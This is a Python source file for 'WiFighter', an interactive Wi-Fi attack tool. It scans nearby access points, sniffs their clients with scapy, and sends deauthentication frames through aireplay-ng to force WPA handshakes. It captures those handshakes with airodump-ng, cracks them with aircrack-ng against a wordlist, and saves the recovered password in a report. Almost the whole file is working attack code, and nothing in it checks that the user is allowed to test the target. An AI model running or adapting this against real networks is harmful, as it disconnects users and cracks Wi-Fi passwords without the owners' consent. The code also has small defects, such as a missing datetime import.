#!venv/bin/python

# | IMPORT | #

import os, sys, subprocess, time, re, multiprocessing
from multiprocessing import Process, Pipe
from prettytable import PrettyTable 
import psutil
from scapy.all import *
from scapy.all import Dot11


# | GRAPHICS | #

ORANGE = '\033[38;5;214m' # Main color
YELLOW = '\033[33m' # System action
RED = '\033[31m' # Error
GREEN = '\033[32m' # Correct
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
RESET = '\033[0m' # Reset color

LOGO = r"""
 __      __._____________.__       .__     __                
/  \    /  \__\_   _____/|__| ____ |  |___/  |_  ___________ 
\   \/\/   /  ||    __)  |  |/ ___\|  |  \   __\/ __ \_  __ )
 \        /|  ||     \   |  / /_/  >   Y  \  | \  ___/|  | \/
  \__/\  / |__|\___  /   |__\___  /|___|  /__|  \___  >__|   
       \/          \/      /_____/      \/          \/                                                                           
"""


 #------------------------------------------------------------------------------------

# | GLOBAL VARIABLES | #

interfering_services = ['NetworkManager', 'wpa_supplicant']
attack_list = ['Handshake Crack', 'WPS Crack']
deauth_modes = ['Client deauth', 'Broadcast', 'Silent']

wifi_networks = []
interface = None
target_ap = None
attack = None
attack_mode = None
sniffed_clients = []
output_file = None

# Get the full path of wifighter dir
wifighter_path = os.path.dirname(os.path.abspath(__file__))

 #------------------------------------------------------------------------------------

 # | INTRODUCTION | #

def introduction():
     os.system('clear')
     # Show logo
     print(f"{BLUE}{LOGO}{RESET}")
     print()
     print(f"{BLUE}Welcome :D This is WiFighter!{RESET}")
     print(f"{BLUE}Easy-to-use WiFi pen-testing security tool{RESET}")
     #print(" ")
     #print(f"{MAGENTA}Build by Filip Struhar | https://github.com/FilipStruhar{RESET}")

     print()
     print()

def logo():
     os.system('clear')
     # Show logo
     print(f"{BLUE}{LOGO}{RESET}")
     print()
     print()

#---------------------------------

 # | Global Functions | #

def create_cap_dir(target, output_dir):
     if target:
          if not os.path.exists(output_dir):
               print(f"{CYAN}[>]{RESET} Creating capture directory -> WiFighter/attacks/{target.replace(' ', '_')}")
               os.system(f'mkdir {output_dir}')

def create_dir(path):
     if not os.path.exists(path):
          os.system(f'mkdir -p {path}')
        

def generate_report(attack, target_ap, crack, target, output_dir):
     current_time = datetime.now()
     timestamp = current_time.strftime("%Y-%m-%d %H:%M:%S")
     filename = attack.lower().replace(" ", "_") + f'_{str(timestamp).replace(" ", "_")}'

     print(f"{YELLOW}[>]{RESET} Generating report -> WiFighter/attacks/{target.replace(' ', '_')}/reports/{filename}.report")

     template = f"""
| {target} - {timestamp} |

* {attack} *

SSID: {target_ap['SSID']}
BSSID: {target_ap['BSSID']}
Channel: {target_ap['Channel']}
Band: {target_ap['Band']}
----
Encryption: {target_ap['Encryption']}
Authetication: {target_ap['Auth']}
Cipher: {target_ap['Cipher']}

Cracked wifi password: {crack}
     """

     create_cap_dir(target, output_dir)
     with open(f'{output_dir}/reports/{filename}.report', 'w') as report:
          report.write(template)


#---------------------------------

 # | MONITOR MODE | #

def start_services(verbose):
     global interfering_services
     for service in interfering_services:
          status = os.popen(f'systemctl is-active {service}').read().strip()

          if status == 'inactive':
               if verbose:
                    print(f"{CYAN}Starting {service} service...{RESET}")
               os.system(f'systemctl start {service}')
          else:
               if verbose:
                    print(f"{CYAN}{service} service is already running.{RESET}")

def stop_services(verbose):
     global interfering_services
     for service in interfering_services:
          status = os.popen(f'systemctl is-active {service}').read().strip()

          if status == 'active':
               if verbose:
                    print(f"{CYAN}Stopping {service} service...{RESET}")
               os.system(f'systemctl stop {service}')
          else:
               if verbose:
                    print(f"{CYAN}{service} service is not running.{RESET}")


def interface_mode(interface):
     mode = None
     interface_info = os.popen(f'iw dev {interface} info 2>&1').read()
     if 'type managed' in interface_info:
          mode = 'Managed'
     elif 'type monitor' in interface_info:
          mode = 'Monitor'

     return mode


def monitor_switch(verbose, command, interface):
     mode = interface_mode(interface)

     if mode:
          # Start Monitor mode
          if command == "start" and mode == "Managed":
               # Kill interfering services
               stop_services(verbose)

               # Switch interface to Monitorw
               os.system(f'ip link set {interface} down 2>&1')
               if verbose:
                    print(f"{CYAN}Setting {interface} to monitor mode...{RESET}")
               os.system(f'iw dev {interface} set type monitor 2>&1')
               os.system(f'ip link set {interface} up 2>&1')
          elif command == "start":
               if verbose:
                print(f'{CYAN}Interface {interface} is already in Monitor Mode, skipping...{RESET}')
          
          # Stop Monitor mode
          if command == "stop" and mode == "Monitor":
               # Switch interface to Managed
               os.system(f'ip link set {interface} down 2>&1')
               if verbose:
                    print(f"{CYAN}Setting {interface} to managed mode...{RESET}")
               os.system(f'iw dev {interface} set type managed 2>&1')
               os.system(f'ip link set {interface} up 2>&1')

               # Start needed services
               start_services(verbose)

          elif command == "stop":
               if verbose:
                    print(f'{CYAN}Interface {interface} is already in Managed Mode, skipping...{RESET}')              
     elif verbose:
          print(f'{RED}Interface "{interface}" does not exist! Retype "wifighter [start/stop/status] [-INTERFACE_NAME-]"{RESET}')


def list_interfaces():
     interfaces_path = '/sys/class/net/'
     print(f"{CYAN}Detected Wi-Fi Interfaces:{RESET}\n")
    # Iterate over all the interfaces in the directory
     for interface in os.listdir(interfaces_path):
          # Make sure that the interface is a wireless interface
          if os.path.exists(os.path.join(interfaces_path, interface, 'wireless')):
               print(f"{CYAN}{interface}{RESET}")

#---------------------------------

 # | CHOOSING | #

def choose_interface():
     interfaces_path = '/sys/class/net/'
     detected_interfaces = []

    # Iterate over all the interfaces in the directory
     for interface in os.listdir(interfaces_path):
          # Make sure that the interface is a wireless interface
          if os.path.exists(os.path.join(interfaces_path, interface, 'wireless')):
               detected_interfaces.append(interface)

     idx = 1
     # Show detected interfaces
     print(f"{CYAN}| Select Interface |{RESET}\n")

     for interface in detected_interfaces:
          print(f"{idx}. {interface}")
          idx += 1

     try:
          while True:     
               try:
                    # Prompt the user to choose an interface by number
                    choice = int(input(f"\nInterface number: ")) - 1
               except ValueError:
                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                    continue
               
               # Check if the choice is in range
               if 0 <= choice < len(detected_interfaces):
                    # Return chosen interface
                    interface = detected_interfaces[choice]
                    return interface
               else:
                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
     except KeyboardInterrupt:
          print(f"\n\n{BLUE}Exiting the tool...{RESET}")

def choose_target():
     global wifi_networks
     try:
          while True:     
               try:
                    # Prompt the user to choose an interface by number
                    choice = int(input(f"\n\nTarget number: "))
               except ValueError:
                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                    continue
               # Check if the choice is in range
               if 0 <= choice < len(wifi_networks):
                    target_ap = wifi_networks[choice]
                    return target_ap # Return chosen interface
               else:
                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
     except KeyboardInterrupt:
          print(f"\n\n{BLUE}Exiting the tool...{RESET}")

def choose_attack(target_ap):
     global attack_list

     print(f'{CYAN}| Select Attack |{RESET}\n')
     target_ap = f"{target_ap['SSID']} ({target_ap['BSSID']})" if target_ap['SSID'] else target_ap['BSSID']
     print(f'Select attack on {target_ap}')

     idx = 1
     # Show attack modes
     for attack in attack_list:
          print(f"{idx}. {attack}")
          idx += 1
     try:
          while True:     
               try:
                    # Prompt the user to choose an attack by number
                    choice = int(input(f"\nAttack number: ")) - 1
               except ValueError:
                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                    continue

               # Check if the choice is in range
               if 0 <= choice < len(attack_list):
                    attack = attack_list[choice]
                    return attack # Return chosen attack
               else:
                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
     except KeyboardInterrupt:
          print(f"\n\n{BLUE}Exiting the tool...{RESET}")

def choose_deauth_mode():
     global deauth_modes
     
     print(f'{CYAN}| Select Deauth Mode |{RESET}\n')

     idx = 1
     # Show attack modes
     for deauth_mode in deauth_modes:
          print(f"{idx}. {deauth_mode}")
          idx += 1
     try:
          while True:     
               try:
                    # Prompt the user to choose an deauth mode by number
                    choice = int(input(f"\nMode number: ")) - 1
               except ValueError:
                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                    continue

               # Check if the choice is in range
               if 0 <= choice < len(deauth_modes):
                    deauth_mode = deauth_modes[choice]
                    return deauth_mode # Return chosen deauth mode
               else:
                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
     except KeyboardInterrupt:
          print(f"\n\n{BLUE}Exiting the tool...{RESET}")

def choose_wordlist():
     global wifighter_path
     wordlists_path = f'{wifighter_path}/wordlists/'
     detected_wordlists = []

     # Create wordlists directory doesn't exist
     create_dir(wordlists_path)

     # Iterate over all the interfaces in the directory
     for wordlist in os.listdir(wordlists_path):
          detected_wordlists.append(wordlist)

     if detected_wordlists:
          idx = 1
          # Show detected interfaces
          print(f"\n{CYAN}Select wordlist for cracking:{RESET}\n")

          for wordlist in detected_wordlists:
               print(f"{idx}. {wordlist}")
               idx += 1

          try:
               while True:     
                    try:
                         # Prompt the user to choose an interface by number
                         choice = int(input(f"\nWordlist number: ")) - 1
                    except ValueError:
                         print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                         continue
                    
                    # Check if the choice is in range
                    if 0 <= choice < len(detected_wordlists):
                         # Return chosen interface
                         wordlist = detected_wordlists[choice]
                         return wordlist
                    else:
                         print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
          except KeyboardInterrupt:
               pass     
     else:
          print(f"\n{YELLOW}No wordlists found! Skipping password cracking... Add wordlists -> WiFighter/wordlists/{RESET}")


 #------------------------------------------------------------------------------------

# | AP Scan | #

def scan_ap(interface):
     wifi_networks = []

     def scan_wifi(interface, conn):
          while True:
               try:
                    # Run the iw scan command with stderr redirected to stdout
                    command = f'iw dev {interface} scan 2>&1'
                    scan_result = os.popen(command).read()
                    if 'Device or resource busy' in scan_result or 'Operation not supported' in scan_result or 'Network is down' in scan_result or 'command failed' in scan_result:
                         # Continue scanning if an error occurs
                         continue
                    conn.send(scan_result)
                    conn.close()
                    break
               except KeyboardInterrupt:
                    conn.close()
                    break
     def loading_animation(conn):
          spinner = ['|', '/', '-', '\\']
          idx = 0
          try:
               # Show the loading animation while scan not completed
               while True:
                    if conn.poll():
                         break
                    sys.stdout.write(f"\r{CYAN}{spinner[idx % len(spinner)]}{RESET} Scanning for APs on {interface}")
                    sys.stdout.flush()
                    idx += 1
                    time.sleep(0.1)
          except KeyboardInterrupt:
               conn.close()
     
     parent_conn, child_conn = multiprocessing.Pipe()
     scan_process = Process(target=scan_wifi, args=(interface, child_conn))
     animation_process = Process(target=loading_animation, args=(parent_conn,))
     
     scan_process.start()
     animation_process.start()
     scan_process.join()
     animation_process.join()
     
     # Get iw scan result
     scan = parent_conn.recv()
               
     # Divide the output into separate AP sections (split by specific BSS occurrence)
     ap_array = re.split(r"(?=BSS [0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})", scan)
     
     # Skip first - not AP
     ap_array = ap_array[1:]

     # Define patterns for extracting AP data
     ssid_pattern = r'SSID:\s*(.+)'
     bssid_pattern = r"([0-9A-Fa-f:]{17})"           
     signal_pattern = r"signal: (-?\d+\.\d+) dBm"
     channel_pattern = r"primary channel: (\d+)"
     frequency_pattern = r"freq: (\d+\.\d+)" 
     auth_pattern = r'\* Authentication suites: (.+?)\n'
     cipher_pattern = r'\* Pairwise ciphers: (.+?)\n'

     for ap in ap_array:

          ssid_match = re.search(ssid_pattern, ap)
          bssid_match = re.search(bssid_pattern, ap)
          signal_match = re.search(signal_pattern, ap)
          channel_match = re.search(channel_pattern, ap)
          frequency_match = re.search(frequency_pattern, ap)
          auth_match = re.search(auth_pattern, ap)
          cipher_match = re.search(cipher_pattern, ap)
          
          # Extract AP properties or set to None if not found
          ssid = ssid_match.group(1).strip() if ssid_match else None
          bssid = bssid_match.group(1).strip() if bssid_match else None
          signal = f'{round(float(signal_match.group(1).strip()))}' if signal_match else None
          channel = channel_match.group(1).strip() if channel_match else None
          frequency = round(float(frequency_match.group(1).strip())) if frequency_match else None
          auth = auth_match.group(1).strip() if auth_match else None
          cipher = cipher_match.group(1).strip() if cipher_match else None
          
          # Map frequency to band (e.g., 2.4 GHz or 5 GHz)
          band = None
          if frequency:
               if frequency < 3000:
                    band = "2.4 GHz"
               elif frequency >= 5000:
                    band = "5 GHz"

          # Determine security type
          encryption = None
          if auth and cipher:
               if 'SAE' in auth:
                    encryption = 'WPA3'
               elif (auth == 'PSK' or auth == 'IEEE 802.1X') and 'CCMP' in cipher:
                    encryption = 'WPA2'
               elif (auth == 'PSK' or auth == 'IEEE 802.1X') and 'TKIP' in cipher:
                    encryption = 'WPA'
               elif 'PSK' not in auth:
                    encryption = 'WEP' 
          else:
               encryption = "Open/Unknown"
          
          if int(signal) > -100:
               # Append parsed AP information to array
               wifi_networks.append({
                    'SSID': ssid,
                    'BSSID': bssid,
                    'Channel': channel,
                    'Signal': signal,
                    'Band': band,
                    'Encryption': encryption,
                    'Auth': auth,
                    'Cipher': cipher
               })
                    
     # Sort array by signal strength (strongest first)
     wifi_networks = sorted(wifi_networks, key=lambda x: x['Signal'], reverse=False)

     return wifi_networks

def list_ap(wifi_networks):
     # Create AP table
     table = PrettyTable()
     table.field_names = ["ID", "SSID", "BSSID", "Channel", "Signal (dBm)", "Band", "Encryption", "Auth", "Cipher"]
     for idx, ap in enumerate(wifi_networks):
          table.add_row([
               f"{idx}",
               ap['SSID'] or "N/A",
               ap['BSSID'] or "N/A",
               ap['Channel'] or "N/A",
               f"{ap['Signal']} dBm" if ap['Signal'] else "N/A",
               ap['Band'] or "N/A",
               ap['Encryption'] or "N/A",
               ap['Auth'] or "N/A",
               ap['Cipher'] or "N/A"
          ])

     print(f"{CYAN}| AP Scan |{RESET}")
     print(f"{MAGENTA}{table}{RESET}")
     print("\nPress [Ctrl + C] to stop")


 #------------------------------------------------------------------------------------

# | Handshake Crack | #

def sniff_clients(interface, target_ap):
     clients = set()
     def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            # Check if the packet is a data frame and from/to the target BSSID
            if pkt.type == 2 and (pkt.addr2 == target_ap or pkt.addr1 == target_ap):
                if pkt.addr2 == target_ap and pkt.addr1 not in clients and pkt.addr1.lower() != 'ff:ff:ff:ff:ff:ff':
                    client = f'{pkt.addr2} -> {pkt.addr1}' # AP MAC -> Client MAC
                    clients.add(client)
                elif pkt.addr1 == target_ap and pkt.addr2 not in clients and pkt.addr2.lower() != 'ff:ff:ff:ff:ff:ff':
                    client = f'{pkt.addr1} -> {pkt.addr2}' # AP MAC -> Client MAC
                    clients.add(client)
     #print('Start sniffing')
     sniff(iface=interface, prn=packet_handler, timeout=10)  # Start sniffing on the specified interface
     #print('Stop sniffing')
     return list(clients)
def list_clients(sniffed_clients, ssid, bssid):
     # Create AP table
     table = PrettyTable()
     table.field_names = ["ID", "AP MAC -> Client MAC"]
     for idx, client_mac in enumerate(sniffed_clients):
          table.add_row([
               f"{idx}",
               client_mac or "N/A"
          ])
     if ssid:
          print(f"{CYAN}| {ssid}'s ({bssid}) Clients |{RESET}")
     else:
          print(f"{CYAN}| {bssid} Clients |{RESET}")
     print(f"{MAGENTA}{table}{RESET}")
     print("\nPress [Ctrl + C] to stop")
def choose_target_client():
     global sniffed_clients, wifighter_path, output_file
     try:
          while True:     
               try:
                    # Prompt the user to choose an interface by number
                    choice = int(input(f"\n\nTarget client number: "))
               except ValueError:
                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                    continue
               # Check if the choice is in range
               if 0 <= choice < len(sniffed_clients):
                    target_client = sniffed_clients[choice]
                    return target_client # Return chosen interface
               else:
                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
     except KeyboardInterrupt:
          print(f"\n\n{BLUE}Exiting the tool...{RESET}")

def handshake_crack(target_ap, interface, deauth_mode):
     # Prepare variables
     ssid = target_ap['SSID'] if target_ap['SSID'] else None
     bssid = target_ap['BSSID'] if target_ap['BSSID'] else None
     target = ssid if ssid else bssid # Set target by checking if SSID set
     channel = target_ap['Channel'] if target_ap['Channel'] else None
     deauth_mode = deauth_mode.lower()
     target_client = None
     wordlist = None
     password = None

     # Set deauth client if needed
     if deauth_mode == 'client deauth' and not target_client:
          logo()
          print(f"Sniffing for {target}'s clients...")
          try:
               while True:
                    # Get available AP's
                    sniff_output = sniff_clients(interface, bssid) # Get output array from iw
                    #print(sniff_output)
                    if sniff_output and isinstance(sniff_output, list):
                         sniffed_clients = sniff_output 
                    if sniffed_clients:
                         logo()
                         list_clients(sniffed_clients, ssid, bssid) # Show available clients's in table
                    time.sleep(3)
          except KeyboardInterrupt:
               if sniffed_clients:
                    # Let user choose client as target
                    target_client = choose_target_client().split('->')[1].strip() # Cut of the "AP MAC ->"" from the string
               else:
                    print(f"\n\n{RED}No clients found, exiting...{RESET}\n")


     # Define output dir for handshakes
     output_dir = f"{wifighter_path}/attacks/{target.replace(' ', '_')}"

     # Determine handshake capture file
     def list_files(directory): 
          return set(os.listdir(directory))
     def cap_file(files_before, files_after):
          new_files = files_after - files_before

          for filename in new_files:
               if '.cap' in filename:
                    return filename       

     # Kill airodump processes after capturing handshake
     def kill_airodump_processes():
          for proc in psutil.process_iter(['pid', 'name']):
               try:
                    if proc.info['name'] == 'airodump-ng':
                         proc.terminate()
                         proc.wait()
               except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
          print(f"{CYAN}[>]{RESET} Killing all airodump-ng processes...")

     # Run airodump-ng
     def run_airodump(interface, bssid, channel, output_dir):
          if interface and bssid and channel and output_dir:
               try:
                    command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', f'{output_dir}/handshake', interface]
                    subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
               except:
                    pass

     # Run aireplay-ng
     def run_aireplay(interface, bssid, target_client, deauth_mode):
          if interface and bssid and deauth_mode:
               if deauth_mode == "client deauth":
                    if target_client:
                         try:
                              command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', target_client, interface]
                              subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                              print(f"{CYAN}[>]{RESET} Deauth packet send to client {target_client}{RESET}")
                         except:
                              pass
               elif deauth_mode == "broadcast":
                    try:
                         command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, interface]
                         subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                         print(f"{CYAN}[>]{RESET} Deauth packet send to broadcast")
                    except:
                         pass
     

     logo()
     print(f'{CYAN}| Handshake Crack |{RESET}\n')
     if ssid:
          print(f'Attacking on {ssid} ({bssid}) with {interface}...')
     else:
          print(f'Attacking on {bssid} with {interface}...')

     create_cap_dir(target, output_dir) # Create capture dir if not exist

     # Handle cases where handshake cracking not possible
     if target_ap['Encryption'] == 'Open/Unknown':
          print(f"\n{YELLOW}!! This is either Open network or the encryption type wasn't recognized correctly !! Skipping...{RESET}")
          return
     elif target_ap['Encryption'] == 'WPA3' or target_ap['Auth'] == 'IEEE 802.1X':
          print(f"\n{YELLOW}!! WPA3 protected or Enterprise authenticated networks aren't vulnerable to this type of attack !! Skipping...{RESET}")
          return

     # Define processes
     capture_handshake = multiprocessing.Process(target = run_airodump, args=(interface, bssid, channel, output_dir))
     deauth_clients = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target_client, deauth_mode))

     files_before = list_files(output_dir) # Get files before airodump-ng adds new

     # Listen for handshake
     capture_handshake.start() # Start airodump-ng process
     time.sleep(2)

     # Deauth client/s if selected
     if deauth_mode != 'silent':
          deauth_clients.start() # Start aireplay-ng process
          deauth_clients.join() # Wait for the process to stop

     files_after = list_files(output_dir) # Get files after airodump-ng adds new
     output_file = cap_file(files_before, files_after) # Determine output_file in which airodump-ng stores

     # Wait and verify that handshake was captured successfuly
     captured = False
     print(f"{CYAN}[>]{RESET} Waiting for handshake...")
     if deauth_mode != 'silent':
          start_time = time.time() # Start deauth timer
     while not captured:
          if os.path.exists(f"{output_dir}/{output_file}"):
               try:
                    command = ['sudo', 'aircrack-ng', f'{output_dir}/{output_file}']
                    verify = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    output = str(verify.communicate())
               except:
                    pass
               if "(0 handshake)" not in output and "Unknown" not in output and "No networks found, exiting." not in output:
                    print(f"{CYAN}[>]{RESET} Handshake/s captured!")
                    captured = True

          # Periodically deauth                    
          if deauth_mode != 'silent':
               end_time = time.time() # End deauth timer
               elapsed_time = end_time - start_time
               elapsed_time = int(elapsed_time) # Get elapsed time before last deauth
               if elapsed_time >= 20:
                    deauth_clients = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target_client, deauth_mode))
                    deauth_clients.start() # Start aireplay-ng process
                    deauth_clients.join() # Wait for the process to stop
                    start_time = time.time() # Reset deauth timer

          time.sleep(1)

     kill_airodump_processes() # Kill all airodump-ng processes

     try:
          wordlist = choose_wordlist()
     except KeyboardInterrupt:
          pass
     
     # Try cracking the password
     if wordlist:
          try:
               print(f"{CYAN}[>]{RESET} Cracking handshake with {wordlist}")
               command = ['sudo', 'aircrack-ng', '-w', f'wordlists/{wordlist}', f'{output_dir}/{output_file}']
               crack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
               output = str(crack.communicate())

               if 'KEY FOUND!' in output:
                    password_pattern = r'KEY FOUND!\s* \[\s*(.+?)\s*\]'
                    password_match = re.search(password_pattern, output) # Search for the pattern in the output string

                    # Extract and print the key if found
                    if password_match:
                         password = password_match.group(1)
                         print(f"\n{YELLOW}[>]{RESET} Password cracked! [ {password} ]")
                         create_dir(f'{output_dir}/reports')
                         generate_report('Handshake Crack', target_ap, password, target, output_dir)
          except KeyboardInterrupt:
               pass
     
     if not password or not wordlist:
          print(f"\n{CYAN}[>]{RESET} Password not found...")
          print(f"{YELLOW}[>]{RESET} Handshake available for offline cracking -> WiFighter/attacks/{target.replace(' ', '_')}/{output_file}")


#------------------------------------------------------------------------------------


# | CODE | #

cmd_lenght = len(sys.argv)

# Subcommands catch
if cmd_lenght > 1:
     if cmd_lenght == 2:
          command = sys.argv[1].lower()
          if command == "list":
               list_interfaces()
               print()
          elif command == "wake":
               start_services('verbose')
               print()
          elif command == "kill":
               stop_services('verbose')
               print()
          else:
               print(f'{RED}Invalid Command! Type "wifighter [start/stop/status/list/wake/kill] (-INTERFACE_NAME-)"\n{RESET}')
          
     elif cmd_lenght == 3:
          command = sys.argv[1].lower()
          interface = sys.argv[2]

          if command == "start" or command == "stop": # Interface mode switch function
               monitor_switch('verbose', command, interface)
               print()
          elif command == "status": # Show interface mode status
               mode = interface_mode(interface)
               if mode:
                    print(f'{CYAN}Interface {interface} is {mode}\n{RESET}')
               else:
                    print(f'{RED}Interface "{interface}" does not exist! Type "wifighter [start/stop/status] (-INTERFACE_NAME-)"\n{RESET}')
          else:
               print(f'{RED}Invalid Command! Type "wifighter [start/stop/status] (-INTERFACE_NAME-)"\n{RESET}')
     else:
          print(f'{RED}Invalid Command! Type "wifighter [start/stop/status] (-INTERFACE_NAME-)"\n{RESET}')
else:
     # | WIFIGHTER TOOL |

     introduction()
     interface = choose_interface() # Choose scanning/attacking interface

     # Scan and choose target AP
     if interface:
          monitor_switch(None, 'stop', interface) # Make sure interface is in Managed
          start_services(None) # Make sure network services are running
          try:
               while True:
                    # Get available AP's
                    scan_output = scan_ap(interface) # Get output array from iw
                    if scan_output and isinstance(scan_output, list):
                         wifi_networks = scan_output 
                    if wifi_networks:
                         print(wifi_networks)
                         logo()
                         list_ap(wifi_networks) # Show available AP's in table
                    time.sleep(1) # Wait before each scan
          except KeyboardInterrupt:
               if wifi_networks:
                    target_ap = choose_target() # Let user choose AP as target
               else:
                    print(f"\n\n{RED}No AP's found, exiting...{RESET}\n")

     # List attack possibilities
     if target_ap:
          logo()
          attack = choose_attack(target_ap)
     
     # Run attacks
     if attack:
          monitor_switch('verbose', 'start', interface) # Make sure interface is in Monitor
          stop_services('verbose') # Make sure interfering services are not running
          logo()
          if attack == 'Handshake Crack':
               deauth_mode = choose_deauth_mode()
               if deauth_mode:
                    try:
                         handshake_crack(target_ap, interface, deauth_mode) # Start attack
                    except KeyboardInterrupt:
                         print(f"\n\n{BLUE}Exiting the tool...{RESET}")

          elif attack == 'WPS Crack':
               print('WPS...')
     

     # On tool end turn everything back on
     if interface:
          try:
               monitor_switch(None, 'stop', interface)
          except KeyboardInterrupt:
               print(f"\n\n{BLUE}Exiting the tool...{RESET}")
     
